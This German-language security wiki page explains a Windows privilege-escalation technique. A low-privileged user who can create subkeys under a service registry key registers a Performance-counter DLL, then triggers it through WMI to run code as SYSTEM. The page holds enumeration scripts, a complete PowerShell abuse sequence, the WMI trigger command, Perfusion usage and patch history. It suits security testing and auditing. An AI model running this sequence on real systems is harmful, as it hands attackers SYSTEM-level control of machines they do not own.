# AppendData/AddSubdirectory-Berechtigung für die Service-Registry

{{#include ../../banners/hacktricks-training.md}}

**Der ursprüngliche Beitrag ist** [**https://itm4n.github.io/windows-registry-rpceptmapper-eop/**](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)<sup>[[3]](#references)</sup>

## Zusammenfassung

Wenn du nur **`Create Subkey`** / **`AppendData/AddSubdirectory`** für einen Service-Registry-Key besitzt, ist dies trotzdem ein guter privesc-Ansatz. Du kannst normalerweise **`ImagePath`**, **`ServiceDll`** oder andere bereits vorhandene Werte nicht direkt überschreiben, aber du kannst möglicherweise einen **`Performance`**-Unterschlüssel unter folgenden Pfaden erstellen:

- **`HKLM\SYSTEM\CurrentControlSet\Services\RpcEptMapper`**
- **`HKLM\SYSTEM\CurrentControlSet\Services\Dnscache`**
- Jedem anderen **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`**-Key, für den dein Token über **`KEY_CREATE_SUB_KEY`** verfügt

Der Trick besteht darin, dass Windows weiterhin das veraltete Registrierungsmodell **PerfLib V1** unterstützt. Wenn ein Service über einen **`Performance`**-Unterschlüssel verfügt, kann Windows daraus eine DLL laden, sobald ein Performance-Counter-Consumer Daten anfordert.

Laut der Microsoft-Dokumentation ist die minimale Registrierung:<sup>[[1]](#references)</sup>
```text
HKLM\SYSTEM\CurrentControlSet\Services\<service>\Performance
Library = C:\Path\payload.dll
Open    = OpenPerfData
Collect = CollectPerfData
Close   = ClosePerfData
```
Die offensive Erkenntnis lautet daher: **Verwerfe einen Service-Registry-Befund nicht einfach, nur weil du nur `CreateSubKey` statt `SetValue` erhalten hast**.<sup>[[3]](#references)</sup>

## Warum dies für Code Execution ausreicht

Der Unterschlüssel `Performance` existiert bei diesen Services normalerweise **nicht standardmäßig**, daher ist **`KEY_CREATE_SUB_KEY`** das benötigte Primitive. Sobald der Schlüssel existiert und `Library`/`Open`/`Collect`/`Close` enthält, kann jeder **Performance-Counter-Consumer** das Laden der DLL auslösen.<sup>[[3]](#references)</sup>

Einige wichtige Details:

- Der Wert **`Library`** kann auf einen **vollständigen DLL-Pfad** verweisen.
- Die DLL muss **`OpenPerfData`**, **`CollectPerfData`** und **`ClosePerfData`** exportieren und `ERROR_SUCCESS` zurückgeben.
- Der Code wird im **Kontext des Consumers** ausgeführt, **nicht zwingend im Prozess des verwundbaren Services selbst**.
- Im klassischen Fall mit `RpcEptMapper` / `Dnscache` kann eine **WMI-Performance-Abfrage** dazu führen, dass **`wmiprvse.exe`** die DLL als **`NT AUTHORITY\SYSTEM`** lädt.

Deshalb wird dieses Primitive beim Triage leicht übersehen: Der übergeordnete Service-Schlüssel ist nicht „vollständig beschreibbar“, kann aber trotzdem als Waffe eingesetzt werden.

## Schnelle Enumeration

Manuelle Stichprobe mit **AccessChk**:
```bash
accesschk.exe -k -w hklm\system\currentcontrolset\services\rpceptmapper
accesschk.exe -k -w hklm\system\currentcontrolset\services\dnscache
```
PowerShell-Beispiel zur Suche nach Principals mit niedrigen Berechtigungen für **`CreateSubKey`** auf Dienstschlüsseln:
```powershell
Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services | ForEach-Object {
$weak = (Get-Acl $_.PSPath).Access | Where-Object {
$_.AccessControlType -eq 'Allow' -and
($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::CreateSubKey) -eq [System.Security.AccessControl.RegistryRights]::CreateSubKey -and
$_.IdentityReference -match 'Users|Authenticated Users|INTERACTIVE|Network Configuration Operators'
}
if ($weak) {
[pscustomobject]@{Service=$_.PSChildName; Principals=($weak.IdentityReference -join ', '); Rights=($weak.RegistryRights -join '; ')}
}
}
```
Nützliche Tools:

- **PrivescCheck**: `Get-ModifiableRegistryPath` wurde speziell entwickelt, um diese Klasse von Problemen zu erkennen.<sup>[[3]](#references)</sup>
- **SharpUp**: `SharpUp.exe audit ModifiableServiceRegistryKeys`
- **Perfusion**: automatisiert das Ablegen der DLL, die `Performance`-Registrierung, den WMI-Trigger, die Token-Duplizierung und die Bereinigung auf älteren verwundbaren Zielen (zum Beispiel: `Perfusion.exe -c cmd -i -k Dnscache`).<sup>[[4]](#references)</sup>

## Ablauf des Missbrauchs

Erstelle den `Performance`-Unterschlüssel und fülle die erforderlichen Werte aus:<sup>[[3]](#references)</sup>
```powershell
$svc = 'RpcEptMapper' # or Dnscache / NetBT / another vulnerable service
$k = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc\Performance"
New-Item $k -Force | Out-Null
New-ItemProperty $k -Name Library -Value "$pwd\payload.dll" -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Open -Value 'OpenPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Collect -Value 'CollectPerfData' -PropertyType String -Force | Out-Null
New-ItemProperty $k -Name Close -Value 'ClosePerfData' -PropertyType String -Force | Out-Null
```
Lösen Sie dann einen **privileged** Performance Consumer aus. Ein klassisches Beispiel ist eine WMI-Abfrage über `Win32_Perf*`-Klassen:<sup>[[3]](#references)</sup>
```powershell
powershell.exe -NoProfile -Command "Get-WmiObject -List | Where-Object { $_.Name -like 'Win32_Perf*' } | Out-Null"
```
Betriebshinweise:

- Das Starten von **`perfmon.exe`** ist nützlich, um zu überprüfen, ob die Counter-Registrierung korrekt ist, lädt die DLL jedoch normalerweise nur im Kontext **des eigenen Benutzers**.
- Für ein tatsächliches LPE muss ein **privilegierter** Verbraucher wie **WMI** ausgelöst werden.
- Wenn du deinen eigenen Exploit schreibst, führt das direkte Starten von `cmd.exe` innerhalb der DLL normalerweise zu einer Shell in **session 0**. `Perfusion` löst dieses Problem, indem das privilegierte Token in einen Prozess dupliziert wird, der in der Session des Angreifers als angehalten erstellt wurde.<sup>[[4]](#references)</sup>
- Die DLL-Architektur muss zum Ziel-Consumer passen (**x64 auf x64-Systemen**).

## Versionshinweise / aktuelle Entwicklungen

Historisch waren die integrierten schwachen Schlüssel:<sup>[[4]](#references)</sup>

- **Windows 7 / Windows Server 2008 R2**: `RpcEptMapper` und `Dnscache`
- **Windows 8 / Windows Server 2012**: `RpcEptMapper`

`Perfusion` weist darauf hin, dass die Updates vom **April 2021** den einfachen Exploit-Pfad auf aktualisierten **Windows 8 / Windows Server 2012** entfernt haben, während **Windows 7 / Windows Server 2008 R2** über **`Dnscache`** weiterhin ausnutzbar blieb.<sup>[[4]](#references)</sup>

Dieses Primitive ist **nicht nur historisch relevant**. Im **Januar 2025** patchte Microsoft ein verwandtes AD-DS-Problem, bei dem Mitglieder der **`Network Configuration Operators`** Unterschlüssel unter **`Dnscache`** und **`NetBT`** erstellen konnten. Dieselbe Idee der **Performance-counter-DLL-Registrierung** konnte erneut verwendet werden, um auf unterstützten Systemen **SYSTEM** zu erreichen.<sup>[[2]](#references)</sup>

Die moderne Schlussfolgerung ist daher allgemein: Wenn ein Benutzer mit niedrigen Privilegien über **`CreateSubKey`** für **`HKLM\SYSTEM\CurrentControlSet\Services\<service>`** verfügt, sollte geprüft werden, ob ein untergeordnetes **`Performance`**-Schlüsselobjekt ausreicht, bevor die Feststellung verworfen wird.

## Referenzen

- [1] [Microsoft Learn - Creating the Application's Performance Key](https://learn.microsoft.com/en-us/windows/win32/perfctrs/creating-the-applications-performance-key)
- [2] [BirkeP - Active Directory Domain Services Elevation of Privilege Vulnerability (CVE-2025-21293)](https://birkep.github.io/posts/Windows-LPE/)
- [3] [itm4n - Windows RpcEptMapper Service Insecure Registry Permissions EoP](https://itm4n.github.io/windows-registry-rpceptmapper-eop/)
- [4] [itm4n - Perfusion (exploit for the RpcEptMapper registry key permissions vulnerability)](https://github.com/itm4n/Perfusion)

{{#include ../../banners/hacktricks-training.md}}
